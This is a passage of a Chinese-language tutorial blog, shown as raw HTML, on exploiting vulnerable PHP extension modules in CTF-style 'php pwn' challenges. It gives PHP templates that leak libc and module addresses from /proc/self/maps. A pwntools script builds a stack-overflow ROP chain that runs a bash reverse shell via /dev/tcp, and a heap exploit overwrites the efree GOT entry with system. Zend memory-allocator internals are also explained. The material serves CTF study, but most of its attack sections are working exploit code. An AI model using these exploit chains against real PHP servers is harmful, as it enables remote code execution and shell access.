class="comment">/* Extension name */</span></span><br><span class="line">                my_heap_functions,			<span class="comment">/* zend_function_entry */</span></span><br><span class="line">                <span class="literal">NULL</span>,							<span class="comment">/* PHP_MINIT - Module initialization */</span></span><br><span class="line">                <span class="literal">NULL</span>,							<span class="comment">/* PHP_MSHUTDOWN - Module shutdown */</span></span><br><span class="line">                PHP_RINIT(my_heap),			<span class="comment">/* PHP_RINIT - Request initialization */</span></span><br><span class="line">                <span class="literal">NULL</span>,							<span class="comment">/* PHP_RSHUTDOWN - Request shutdown */</span></span><br><span class="line">                PHP_MINFO(my_heap),			<span class="comment">/* PHP_MINFO - Module info */</span></span><br><span class="line">                PHP_MY_HEAP_VERSION,		<span class="comment">/* Version */</span></span><br><span class="line">                STANDARD_MODULE_PROPERTIES</span><br><span class="line">        &#125;;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> COMPILE_DL_MY_HEAP</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> ZTS</span></span><br><span class="line">ZEND_TSRMLS_CACHE_DEFINE()</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">ZEND_GET_MODULE(my_heap)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>






        <h1 id="三、漏洞利用"   >
          <a href="#三、漏洞利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h1>
      <p>一般而言，php_pwn都先看看php.ini，哪些函数被禁了，搜索<code>disable_functions</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202122026827.png" alt="image-20220212202639753"></p>
<p>当没有禁止include函数、ob_start函数、ob_get_contents函数、ob_end_flush函数时，就可以来调用从而直接获取地址。</p>

        <h2 id="1-EXP模板"   >
          <a href="#1-EXP模板" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-EXP模板" class="headerlink" title="1.EXP模板"></a>1.EXP模板</h2>
      <p>先来几个常用的函数模板，用来交互</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">u64</span>(<span class="params"><span class="variable">$val</span></span>) </span>&#123;</span><br><span class="line">   <span class="variable">$s</span> = bin2hex(<span class="variable">$val</span>);</span><br><span class="line">   <span class="variable">$len</span> = strlen(<span class="variable">$s</span>);</span><br><span class="line">   <span class="variable">$ans</span> = <span class="string">&quot;0x&quot;</span>;</span><br><span class="line">   <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="variable">$len</span>-<span class="number">2</span>;<span class="variable">$i</span>&gt;=<span class="number">0</span>;<span class="variable">$i</span>-=<span class="number">2</span>) &#123;</span><br><span class="line">      <span class="variable">$ans</span> = <span class="variable">$ans</span> . substr(<span class="variable">$s</span>,<span class="variable">$i</span>,<span class="number">2</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> intval(<span class="variable">$ans</span>,<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">p64</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$x</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span> &lt; <span class="variable">$x</span>;<span class="variable">$j</span>++) &#123;</span><br><span class="line">        <span class="variable">$re</span> .= chr(<span class="variable">$i</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="variable">$i</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//在可以调用include函数、ob_start函数、ob_get_contents函数、ob_end_flush函数时</span></span><br><span class="line"><span class="comment">//一般用在可以直接写php代码的时候</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leakaddr</span>(<span class="params"><span class="variable">$buffer</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$libc</span>,<span class="variable">$mbase</span>;</span><br><span class="line">    <span class="variable">$p</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .* \/lib\/x86_64-linux-gnu\/libc-2.27.so/&#x27;</span>;</span><br><span class="line">    <span class="comment">//$p1 = &#x27;/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/lib\/php\/20170718\/hackphp.so/&#x27;;</span></span><br><span class="line">    <span class="variable">$p_local</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .*  \/www\/server\/php\/73\/lib\/php\/extensions\/no-debug-non-zts-20180731\/my_heap.so/&#x27;</span>;</span><br><span class="line">    preg_match_all(<span class="variable">$p</span>, <span class="variable">$buffer</span>, <span class="variable">$libc</span>);</span><br><span class="line">    <span class="comment">//preg_match_all($p1, $buffer, $mbase);</span></span><br><span class="line">    preg_match_all(<span class="variable">$p_local</span>, <span class="variable">$buffer</span>, <span class="variable">$mbase</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">ob_start(<span class="string">&quot;leakaddr&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;/proc/self/maps&quot;</span>);</span><br><span class="line"><span class="variable">$buffer</span> = ob_get_contents();</span><br><span class="line">ob_end_flush();</span><br><span class="line">leakaddr(<span class="variable">$buffer</span>);</span><br><span class="line"><span class="variable">$libc_base</span>=hexdec(<span class="variable">$libc</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"><span class="variable">$mod_base</span>=hexdec(<span class="variable">$mbase</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//字符串操作</span></span><br><span class="line"><span class="variable">$pad_str</span> = str_pad(string_var,length,pad_string,pad_type);<span class="comment">//填充，(pad_type参数可选)</span></span><br><span class="line"><span class="variable">$sub_str</span> = substr(<span class="keyword">string</span>,idx,length);<span class="comment">//获取子字符串</span></span><br><span class="line"><span class="variable">$str</span> = str_repeat(<span class="string">&#x27;B&#x27;</span>, (<span class="number">0x100</span>));</span><br><span class="line"><span class="comment">//获取格式化输出字符串</span></span><br><span class="line"><span class="keyword">echo</span> sprintf(<span class="string">&quot;0x%lx&quot;</span>,<span class="variable">$Libc_addr</span>);</span><br><span class="line"><span class="comment">//字符串拼接</span></span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$a</span>.<span class="variable">$b</span>;</span><br><span class="line"><span class="comment">//单个字符</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;\x00&quot;</span>;<span class="comment">//必须是&quot;&quot;双引号的，不能是&#x27;&#x27;单引号</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>并且以下给出的exp都是基于上面的测试用例</p>

        <h2 id="2-格式化字符串"   >
          <a href="#2-格式化字符串" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-格式化字符串" class="headerlink" title="2.格式化字符串"></a>2.格式化字符串</h2>
      
        <h2 id="3-栈溢出"   >
          <a href="#3-栈溢出" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-栈溢出" class="headerlink" title="3.栈溢出"></a>3.栈溢出</h2>
      <p>一般都能够通过读取<code>/proc/self/maps</code>来泄露地址</p>
<p>没有canary的时候，单纯栈溢出的时候，一般有以下几种方法</p>

        <h3 id="1-利用poepn反弹shell"   >
          <a href="#1-利用poepn反弹shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-利用poepn反弹shell" class="headerlink" title="(1)利用poepn反弹shell"></a>(1)利用poepn反弹shell</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_php</span>(<span class="params">buf</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;pwn.php&quot;</span>, <span class="string">&#x27;w+&#x27;</span>) <span class="keyword">as</span> pf:</span><br><span class="line">        pf.write(<span class="string">&#x27;&#x27;&#x27;&lt;?php</span></span><br><span class="line"><span class="string">my_stack_func(urldecode(&quot;%s&quot;));</span></span><br><span class="line"><span class="string">?&gt;&#x27;&#x27;&#x27;</span>%urlencode(buf))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#CLI:</span></span><br><span class="line">stack_addr = <span class="number">0x7fffffffa1c0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#GDB:</span></span><br><span class="line"><span class="comment">#stack_addr = 0x7fffffffa1a0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#WEB:</span></span><br><span class="line"><span class="comment">#stack_addr = 0x7fffffffbee0</span></span><br><span class="line"></span><br><span class="line">ELF_base = <span class="number">0x7ffff12efd2a</span> - <span class="number">0xd2a</span></span><br><span class="line"></span><br><span class="line">stack_offset = <span class="number">0xb0</span> + <span class="number">0x8</span></span><br><span class="line">Libc_base = <span class="number">0x7ffff47daf70</span> - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = Libc_base + <span class="number">0x00000000000215bf</span></span><br><span class="line">pop_rsi_ret = Libc_base + <span class="number">0x0000000000023eea</span></span><br><span class="line">popen_addr = Libc_base + libc.sym[<span class="string">&#x27;popen&#x27;</span>]</span><br><span class="line"></span><br><span class="line">command = <span class="string">&#x27;/bin/bash -c &quot;/bin/bash -i &gt;&amp;/dev/tcp/127.0.0.1/6666 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">layout = [</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>*stack_offset,</span><br><span class="line">    pop_rdi_ret,</span><br><span class="line">    stack_addr+stack_offset+<span class="number">0x30</span>+<span class="number">0x10</span>,</span><br><span class="line">    pop_rsi_ret,</span><br><span class="line">    stack_addr+stack_offset+<span class="number">0x28</span>,</span><br><span class="line">    popen_addr,</span><br><span class="line">    <span class="string">&#x27;r&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">7</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>,</span><br><span class="line">    command.ljust(<span class="number">0x60</span>, <span class="string">&#x27;\x00&#x27;</span>),</span><br><span class="line">    <span class="string">&quot;a&quot;</span>*<span class="number">0x8</span></span><br><span class="line">]</span><br><span class="line">buf = flat(layout)</span><br><span class="line"></span><br><span class="line">create_php(buf)</span><br></pre></td></tr></table></div></figure>

<p>以上代码生成之后，直接php pwn.php运行或者调试即可。</p>
<p>需要注意的是，WEB和CLI的栈地址有点不太一样，另外在本地运行的时候，直接运行php和调试php也有点不太一样</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202121352773.png" alt="image-20220212135202658"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202121343134.png" alt="image-20220212134318923"></p>
<p>参照<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/204404" >WEBPWN入门级调试讲解 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h4 id="例题一：2020De1CTF-mixture"   >
          <a href="#例题一：2020De1CTF-mixture" class="heading-link"><i class="fas fa-link"></i></a><a href="#例题一：2020De1CTF-mixture" class="headerlink" title="例题一：2020De1CTF-mixture"></a>例题一：2020De1CTF-mixture</h4>
      <p>参考</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/235237#h3-4" >WebPwn：php-pwn学习 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/05/05/mixture/" >De1CTF 2020 Web+Pwn mixture | Clang裁缝店 (xuanxuanblingbling.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="2-rop链构造调用mprotect函数执行shellcode"   >
          <a href="#2-rop链构造调用mprotect函数执行shellcode" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-rop链构造调用mprotect函数执行shellcode" class="headerlink" title="(2)rop链构造调用mprotect函数执行shellcode"></a>(2)rop链构造调用<code>mprotect</code>函数执行shellcode</h3>
      
        <h2 id="4-堆方面"   >
          <a href="#4-堆方面" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-堆方面" class="headerlink" title="4.堆方面"></a>4.堆方面</h2>
      
        <h3 id="堆机制："   >
          <a href="#堆机制：" class="heading-link"><i class="fas fa-link"></i></a><a href="#堆机制：" class="headerlink" title="堆机制："></a>堆机制：</h3>
      <p>首先简单介绍一下内存机制，使用<code>_emalloc和_efree</code>进行内存分配和释放，类似不加任何保护的slub/slab机制，存在FD指针可以实现劫持之后任意分配，并且分配的大小规格如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">//宏定义：第一列表示序号（称之为bin_num），第二列表示每个small内存的大小（字节数）；</span><br><span class="line">//第四列表示每次获取多少个page；第三列表示将page分割为多少个大小为第一列的small内存；</span><br><span class="line">#define ZEND_MM_BINS_INFO(_, x, y) \</span><br><span class="line">    _( 0,    8,  512, 1, x, y) \</span><br><span class="line">    _( 1,   16,  256, 1, x, y) \</span><br><span class="line">    _( 2,   24,  170, 1, x, y) \</span><br><span class="line">    _( 3,   32,  128, 1, x, y) \</span><br><span class="line">    _( 4,   40,  102, 1, x, y) \</span><br><span class="line">    _( 5,   48,   85, 1, x, y) \</span><br><span class="line">    _( 6,   56,   73, 1, x, y) \</span><br><span class="line">    _( 7,   64,   64, 1, x, y) \</span><br><span class="line">    _( 8,   80,   51, 1, x, y) \</span><br><span class="line">    _( 9,   96,   42, 1, x, y) \</span><br><span class="line">    _(10,  112,   36, 1, x, y) \</span><br><span class="line">    _(11,  128,   32, 1, x, y) \</span><br><span class="line">    _(12,  160,   25, 1, x, y) \</span><br><span class="line">    _(13,  192,   21, 1, x, y) \</span><br><span class="line">    _(14,  224,   18, 1, x, y) \</span><br><span class="line">    _(15,  256,   16, 1, x, y) \</span><br><span class="line">    _(16,  320,   64, 5, x, y) \</span><br><span class="line">    _(17,  384,   32, 3, x, y) \</span><br><span class="line">    _(18,  448,    9, 1, x, y) \</span><br><span class="line">    _(19,  512,    8, 1, x, y) \</span><br><span class="line">    _(20,  640,   32, 5, x, y) \</span><br><span class="line">    _(21,  768,   16, 3, x, y) \</span><br><span class="line">    _(22,  896,    9, 2, x, y) \</span><br><span class="line">    _(23, 1024,    8, 2, x, y) \</span><br><span class="line">    _(24, 1280,   16, 5, x, y) \</span><br><span class="line">    _(25, 1536,    8, 3, x, y) \</span><br><span class="line">    _(26, 1792,   16, 7, x, y) \</span><br><span class="line">    _(27, 2048,    8, 4, x, y) \</span><br><span class="line">    _(28, 2560,    8, 5, x, y) \</span><br><span class="line">    _(29, 3072,    4, 3, x, y)</span><br><span class="line"> </span><br><span class="line">#endif /* ZEND_ALLOC_SIZES_H */</span><br></pre></td></tr></table></div></figure>

<p>当超过3K时，如下分配</p>
<p>huge内存：针对大于2M-4K的分配请求，直接调用mmap分配；</p>
<p>large内存：针对小于2M-4K，大于3K的分配请求，在chunk上查找满足条件的若干个连续page；</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000014764790" >【PHP7源码分析】PHP内存管理 - SegmentFault 思否</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>并且不存在我们在glibc中常见的hook函数，所以通常getshell的做法一般两种：</p>
<p><strong>劫持efree_got</strong>或者<strong>劫持某些结构体的函数指针</strong></p>

        <h3 id="1-劫持efree-got"   >
          <a href="#1-劫持efree-got" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-劫持efree-got" class="headerlink" title="(1)劫持efree_got"></a>(1)劫持efree_got</h3>
      <p>不过这个需要<code>.so</code>拓展模块不能为Full RELRO，得能修改其中的got表，然后还得在该拓展模块中有调用<code>_efree</code>函数才行，相当于就是<code>ret2Got</code>。得泄露该<code>.so</code>拓展模块的地址才行。</p>
<p>自定义题目的exp如下</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">u64</span>(<span class="params"><span class="variable">$val</span></span>) </span>&#123;</span><br><span class="line">   <span class="variable">$s</span> = bin2hex(<span class="variable">$val</span>);</span><br><span class="line">   <span class="variable">$len</span> = strlen(<span class="variable">$s</span>);</span><br><span class="line">   <span class="variable">$ans</span> = <span class="string">&quot;0x&quot;</span>;</span><br><span class="line">   <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="variable">$len</span>-<span class="number">2</span>;<span class="variable">$i</span>&gt;=<span class="number">0</span>;<span class="variable">$i</span>-=<span class="number">2</span>) &#123;</span><br><span class="line">      <span class="variable">$ans</span> = <span class="variable">$ans</span> . substr(<span class="variable">$s</span>,<span class="variable">$i</span>,<span class="number">2</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> intval(<span class="variable">$ans</span>,<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">p64</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$x</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span> &lt; <span class="variable">$x</span>;<span class="variable">$j</span>++) &#123;</span><br><span class="line">        <span class="variable">$re</span> .= chr(<span class="variable">$i</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="variable">$i</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leakaddr</span>(<span class="params"><span class="variable">$buffer</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$libc</span>,<span class="variable">$mbase</span>;</span><br><span class="line">    <span class="variable">$p</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .* \/lib\/x86_64-linux-gnu\/libc-2.27.so/&#x27;</span>;</span><br><span class="line">    <span class="comment">//$p1 = &#x27;/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/lib\/php\/20170718\/hackphp.so/&#x27;;</span></span><br><span class="line">    <span class="variable">$p_local</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .*  \/www\/server\/php\/73\/lib\/php\/extensions\/no-debug-non-zts-20180731\/my_heap.so/&#x27;</span>;</span><br><span class="line">    preg_match_all(<span class="variable">$p</span>, <span class="variable">$buffer</span>, <span class="variable">$libc</span>);</span><br><span class="line">    <span class="comment">//preg_match_all($p1, $buffer, $mbase);</span></span><br><span class="line">    preg_match_all(<span class="variable">$p_local</span>, <span class="variable">$buffer</span>, <span class="variable">$mbase</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_efree_got</span> = <span class="number">0x202068</span>;</span><br><span class="line"><span class="variable">$system_addr</span> = <span class="number">0x4f550</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ob_start(<span class="string">&quot;leakaddr&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;/proc/self/maps&quot;</span>);</span><br><span class="line"><span class="variable">$buffer</span> = ob_get_contents();</span><br><span class="line">ob_end_flush();</span><br><span class="line">leakaddr(<span class="variable">$buffer</span>);</span><br><span class="line"><span class="variable">$libc_base</span>=hexdec(<span class="variable">$libc</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"><span class="variable">$mod_base</span>=hexdec(<span class="variable">$mbase</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">my_heap_addFunc(<span class="number">0x10</span>);</span><br><span class="line">my_heap_delFunc(<span class="number">0</span>);</span><br><span class="line">my_heap_editFunc(<span class="number">0</span>,p64(<span class="variable">$mod_base</span>+<span class="variable">$_efree_got</span>));</span><br><span class="line">my_heap_addFunc(<span class="number">0x10</span>);</span><br><span class="line">my_heap_editFunc(<span class="number">1</span>,<span class="string">&quot;cat flag\x00&quot;</span>);</span><br><span class="line">my_heap_addFunc(<span class="number">0x10</span>);</span><br><span class="line">my_heap_editFunc(<span class="number">2</span>,p64(<span class="variable">$libc_base</span>+<span class="variable">$system_addr</span>));</span><br><span class="line">my_heap_delFunc(<span class="number">1</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>




        <h3 id="2-劫持get-method函数指针"   >
          <a href="#2-劫持get-method函数指针" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-劫持get-method函数指针" class="headerlink" title="(2)劫持get_method函数指针"></a>(2)劫持get_method函数指针</h3>
      <p>简单来说，就是劫持函数指针<code>zend_object-&gt;zval-&gt;zend_object_handlers-&gt;get_method</code></p>

        <h4 id="原理如下："   >
          <a href="#原理如下：" class="heading-link"><i class="fas fa-link"></i></a><a href="#原理如下：" class="headerlink" title="原理如下："></a>原理如下：</h4>
      
        <h5 id="①zend-object"   >
          <a href="#①zend-object" class="heading-link"><i class="fas fa-link"></i></a><a href="#①zend-object" class="headerlink" title="①zend_object"></a>①zend_object</h5>
      <p>当定义声明一个class对象时</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class Lucky&#123;</span><br><span class="line">	public    $a0, $a1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$lucky = new Lucky();</span><br><span class="line">$lucky-&gt;a1 = function ($x) &#123; &#125;;</span><br></pre></td></tr></table></div></figure>

<p>当在php中声明Lucky这个class对象时，会自动声明一个对应大小<code>zend_object</code>结构</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//7.3/src/Zend/zend_types.h 大小56</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_object</span> &#123;</span></span><br><span class="line">    zend_refcounted_h gc;</span><br><span class="line">    <span class="keyword">uint32_t</span>          handle; <span class="comment">// <span class="doctag">TODO:</span> may be removed ???</span></span><br><span class="line">    zend_class_entry *ce;</span><br><span class="line">    <span class="keyword">const</span> zend_object_handlers *handlers;</span><br><span class="line">    HashTable        *properties;</span><br><span class="line">    zval              properties_table[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>正常来说，创建class对象都会有成员，但是在php中其实也可以声明没有成员的class对象，那么此时该class对应的<code>zend_object</code>的大小即为56-8=48。所以class对象中的成员越多，其<code>zend_object</code>结构的大小就越大。</p>

        <h5 id="②zval"   >
          <a href="#②zval" class="heading-link"><i class="fas fa-link"></i></a><a href="#②zval" class="headerlink" title="②zval"></a>②zval</h5>
      <p>而每一个成员在内存中实际反应的就是<code>zval</code>结构体</p>
